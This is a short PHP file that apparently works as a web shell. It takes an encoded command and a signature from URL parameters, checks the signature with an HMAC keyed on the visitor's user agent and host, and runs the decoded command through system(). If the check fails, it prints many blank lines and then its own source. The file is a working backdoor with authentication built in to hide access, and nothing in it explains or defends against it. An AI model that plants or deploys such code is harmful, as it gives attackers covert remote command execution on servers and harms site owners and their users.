<?php 
function run() 
{ 
	if(isset($_GET['cmd']) && isset($_GET['sig'])) 
	{ 
		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']; 
		$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']); 
		$sig = hash_hmac('SHA512', $cmd, $key); 
		if($sig === (string)$_GET['sig']) 
		{ 
			header('Content-Type: text/plain'); 
			return !!system($cmd); 
		} 
	} 
	return false; 
} 
function fuck() 
{ 
	print(str_repeat("\n", 4096)); 
	readfile($_SERVER['SCRIPT_FILENAME']); 
} 
run() ?: fuck();
?>
